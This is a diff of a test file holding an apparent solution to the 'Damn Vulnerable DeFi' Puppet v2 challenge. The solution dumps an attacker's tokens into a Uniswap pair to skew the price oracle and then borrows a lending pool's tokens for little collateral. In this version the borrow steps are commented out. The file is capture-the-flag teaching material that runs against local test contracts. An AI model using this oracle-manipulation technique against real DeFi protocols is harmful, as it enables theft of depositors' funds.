@@ -11,7 +11,6 @@ describe('[Challenge] Puppet v2', function () {
 	// Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
 	const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('100')
 	const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10')
-
 	const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000')
 	const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000')
 
@@ -36,7 +35,6 @@ describe('[Challenge] Puppet v2', function () {
 			deployer
 		)
 		const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)
-
 		// Deploy tokens to be traded
 		this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy()
 		this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy()
@@ -87,8 +85,6 @@ describe('[Challenge] Puppet v2', function () {
 		).to.be.eq(ethers.utils.parseEther('300000'))
 	})
 
-	/** CODE YOUR EXPLOIT HERE */
-
 	/*  
 		At first the quote() function of the UniswapV2Library returns the correct 
 		stipulated value:
@@ -106,34 +102,49 @@ describe('[Challenge] Puppet v2', function () {
 			newRequiredWETH = ~980.2 * 3 =  ~29.4
 	*/
 	it('Exploit', async function () {
-		// Swap most of attacker's ETH balance to WETH, leaving enough for gas fees
-		ethToWETHAmount = ethers.utils.parseEther('19.9')
+		/** CODE YOUR EXPLOIT HERE */
+
+		console.log(
+			'WETH REQUIRED BEFORE: ',
+			String(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
+		)
+
+		// Swap most of attacker's ETH balance to WETH, leaving some ETH for gas fees
+		const ethToWETHAmount = ethers.utils.parseEther('19.9')
 		await this.weth.connect(attacker).deposit({value: ethToWETHAmount})
 
-		// Approve and swap all DVT balance to WETH using the UniswapRouter contract
-		// This will devaluate the DVT/WETH ratio enormously due to the amount of DVT owned and swapped
-		// by the attacker
+		// Approve all attacker's DVT balance to UniswapRouter contract
 		await this.token
 			.connect(attacker)
 			.approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
 
+		// Swap all DVT tokens to WETH using the UniswapRouter contract.
+		// This will devaluate the DVT/WETH ratio enormously due to the amount of DVT
+		// owned and swapped by the attacker
 		await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
 			ATTACKER_INITIAL_TOKEN_BALANCE, // amountIn
 			0, // amountOutMin
-			[this.token.address, this.weth.address], //[tokenFromUserToPool, tokenFromPoolToUser]
+			[this.token.address, this.weth.address], // [tokenFromUserToPool, tokenFromPoolToUser]
 			attacker.address, // to
 			(await ethers.provider.getBlock('latest')).timestamp * 2 // deadline
 		)
 
-		// The attacker now has enough WETH (~29.8) to borrow all DVT from pool (~29.5)
-		wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
-		await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired)
-		await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+		console.log(
+			'WETH REQUIRED BEFORE: ',
+			String(await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE))
+		)
+
+		// // The attacker now has enough WETH (~29.8) to borrow all DVT from pool (~29.5)
+		// const wethRequired = await this.lendingPool.calculateDepositOfWETHRequired(
+		// 	POOL_INITIAL_TOKEN_BALANCE
+		// )
+		// await this.weth.connect(attacker).approve(this.lendingPool.address, wethRequired)
+		// await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
 	})
 
 	after(async function () {
 		/** SUCCESS CONDITIONS */
-		// // // Attacker has taken all tokens from the pool
+		// Attacker has taken all tokens from the pool
 		// expect(await this.token.balanceOf(this.lendingPool.address)).to.be.eq('0')
 		// expect(await this.token.balanceOf(attacker.address)).to.be.gte(POOL_INITIAL_TOKEN_BALANCE)
 	})
